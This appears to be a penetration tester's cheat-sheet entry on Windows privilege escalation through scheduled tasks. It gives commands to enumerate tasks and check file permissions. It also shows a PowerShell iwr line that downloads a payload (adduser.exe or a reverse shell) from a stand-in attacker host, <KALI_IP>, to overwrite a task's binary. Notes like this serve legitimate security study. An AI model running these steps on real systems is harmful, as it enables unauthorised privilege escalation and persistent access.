# Scheduled Tasks

## Overview

During post-exploitation, it is important to inspect scheduled tasks as they may execute scripts or binaries at regular intervals or system events. If these tasks reference files in writable locations or execute with elevated privileges, they may be abused to execute malicious code. Scheduled tasks can also reveal useful information about system administration and automation processes.

---
Enumerating Tasks
```
schtasks /query /fo LIST /v
```
With PowerShell
```
Get-ScheduledTask | select TaskName,State
```

Find Process with Author or Run As User field as Administrator and check our permissions for ut 
```
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```
Now we can replace or modify the file with a malicious one, using either adduser.exe or a reverse shell then wait for it to run
```
iwr -Uri http://<KALI_IP>/adduser.exe -Outfile BackendCacheCleanup.exe
```
Note the Next Run Time field


```
# SCHEDULED TASKS

# filter for scheduled tasks names and paths and running under context of ...

schtasks /query /fo LIST /v | Select-String -Pattern "TaskName:|Status:|Run As User:|Schedule Type:|Task To Run:" -Context 0,1 | ForEach-Object { $_.Line -replace "^\s+|\s+$", "" }

icacls "C:\Program Files\Enterprise Apps"
```
